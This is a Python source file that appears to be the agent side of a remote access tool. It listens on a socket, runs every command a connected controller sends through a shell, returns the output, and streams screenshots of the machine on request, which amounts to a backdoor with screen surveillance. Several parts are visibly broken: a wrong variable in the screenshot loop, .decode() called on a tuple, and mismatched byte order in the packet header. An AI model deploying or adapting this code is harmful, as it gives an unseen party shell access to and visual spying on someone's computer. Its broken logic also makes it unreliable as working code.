import multiprocessing
from queue import Queue
import subprocess
import socket, sys
import struct, math
import pyautogui as py
from threading import Thread
import socket, io

PACKET_SIZE = 1024

def connectSocket(HOST, PORT, debug: bool = False) -> socket:
    try:
        sckt = socket.socket(socket.AF_INET)
        if debug: 
            print('[+] Server Started')
            print('[+] Listening For Client Connection ...')
        sckt.bind((HOST, PORT))
        sckt.listen(1)
        client, client_addr = sckt.accept()
        if debug:
            print(f'[+] {client_addr} Client connected to the server')   
        return client
    except (Exception): 
        return

def sendPackets(sckt: socket, dataToSend: bytearray, debug: bool, dataType: int):
    try:
        nOfPacketsToSend = math.ceil(len(dataToSend) / PACKET_SIZE)
        bytesSent = 0
        
        for i in range(nOfPacketsToSend):
            packetHeaderLength = min(PACKET_SIZE, len(dataToSend)-bytesSent).to_bytes(4, "big")
            packetHeaderPackets = (nOfPacketsToSend-(i+1)).to_bytes(1, "big")
            packetPayload = dataToSend[i*PACKET_SIZE:(i*PACKET_SIZE)+min(PACKET_SIZE, len(dataToSend)-bytesSent)]
            packetDataType = dataType.to_bytes(1, "big")
            packet = packetHeaderLength + packetHeaderPackets + packetDataType + packetPayload
            bytesSent += min(PACKET_SIZE, len(dataToSend)-bytesSent)

            sckt.sendall(packet)
            if debug:
                print("packet: ", packetHeaderLength, packetHeaderPackets, packetPayload)
    except (Exception):
        return

def recvAll(sckt: socket, n: int) -> bytearray:
    try:
        dataReceived = sckt.recv(n)
        while (len(dataReceived) < n):
            dataReceived += sckt.recv(n-len(dataReceived))
        return dataReceived
    except (Exception):
        return b'EXIT0x02'

def recvPackets(sckt: socket, debug: bool = False) -> bytearray:
    try:
        dataReceived = b""
        packetHeader = recvAll(sckt, 6)

        packetLength = struct.unpack("i", packetHeader[:4])[0]
        nOfPacketsLeft = packetHeader[4]
        payload = recvAll(sckt, packetLength)
        dataReceived += (payload)
        print(packetHeader, payload)
        if debug:
            print("payload: ", dataReceived)
        
        if packetHeader[5] == 0x63:
            while nOfPacketsLeft > 0:
                packetHeader = recvAll(sckt, 6)
                if not packetHeader:
                    return b"EXIT0x02"
                packetLength = struct.unpack("i", packetHeader[:4])[0]
                nOfPacketsLeft = packetHeader[4]
                payload = recvAll(sckt, packetLength) 
                dataReceived += (payload)
        
        
        return (packetHeader[5], dataReceived)
    except:
        return b"EXIT0x02"

def screenShare(frameQueue: Queue):
    while True:
        frame = py.screenshot()
        frameBytes = io.BytesIO()
        frame.save(frameBytes, format="PNG")
        frameQueue.put(frame.getvalue())


def comunicazione(HOST, PORT, debug: bool = False):
    clientSocket = connectSocket(HOST, PORT, True)

    screenBuffersQueue = multiprocessing.Queue(20)
    screenSharer = multiprocessing.Process(target=screenShare, args=(screenBuffersQueue,))

    while 1:
        typeOfRequest, command = recvPackets(clientSocket).decode()

        # DEBUG
        if debug and not command == "":
            print("command: ", command)

        if command == "EXIT0x01":
            screenSharer.terminate()
            sys.exit(0)
        if command == "EXIT0x02":
            screenSharer.terminate()
            screenBuffersQueue.close()
            screenShareActivated = False
            clientSocket = connectSocket(HOST, PORT, True)      

        if typeOfRequest == 0x63:
            output = subprocess.run(command, shell=True, capture_output=True)
            
            if not output.stdout == b"":
                sendPackets(clientSocket, output.stdout, True, 99)
            else:
                sendPackets(clientSocket, b"No output!", True, 99)

            # DEBUG
            if debug and not output.stdout == "":
                print(output.stdout)

        if typeOfRequest == 0x76:
            if not screenSharer.is_alive() and "start" in command:
                screenSharer.start()
                sendPackets(clientSocket, screenBuffersQueue.get(), True, 0x76)

            if "stop" in command:
                screenSharer.terminate()
                sendPackets(clientSocket, b"Video stream stopped!", True, 0x63)
                continue
            
            if "continue" in command:
                sendPackets(clientSocket, screenBuffersQueue.get(), True, 0x76)



